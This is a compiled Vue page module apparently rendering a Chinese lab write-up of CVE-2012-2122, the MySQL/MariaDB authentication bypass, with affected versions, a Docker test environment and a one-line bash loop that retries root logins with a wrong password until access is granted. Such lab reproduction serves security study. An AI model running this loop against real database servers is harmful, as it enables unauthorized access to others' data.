import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as l,c as o,a,b as e,d as n,e as i}from"./app-58e4a7d6.js";const c={},d=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),e(" 漏洞描述")],-1),p=a("p",null,"当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。",-1),u=a("p",null,"参考链接：",-1),h={href:"http://www.freebuf.com/vuls/3815.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/",target:"_blank",rel:"noopener noreferrer"},b=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MariaDB 5.1.62, 5.2.12, 5.3.6, 5.5.23
MySQL 5.1.63, 5.5.24, 5.6.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>经过测试，本环境虽然运行在容器内部，但漏洞是否能够复现仍然与宿主机有一定关系。宿主机最好选择Ubuntu或Mac系统，但也不知道是否一定能够成功，欢迎在Issue中提交更多测试结果。</p><p>执行如下命令启动测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Vulhub环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过正常的Mysql客户端，可以直接登录的，正确root密码是123456。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">\`</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">1000</span><span class="token variable">\`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-pwrong</span> <span class="token parameter variable">-h</span> your-ip <span class="token parameter variable">-P3306</span> <span class="token punctuation">;</span> <span class="token keyword">done</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262249365.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function _(v,k){const s=t("ExternalLinkIcon");return l(),o("div",null,[d,p,u,a("ul",null,[a("li",null,[a("a",h,[e("http://www.freebuf.com/vuls/3815.html"),n(s)])]),a("li",null,[a("a",m,[e("https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/"),n(s)])])]),b])}const x=r(c,[["render",_],["__file","MySQL 身份认证绕过漏洞 CVE-2012-2122.html.vue"]]);export{x as default};
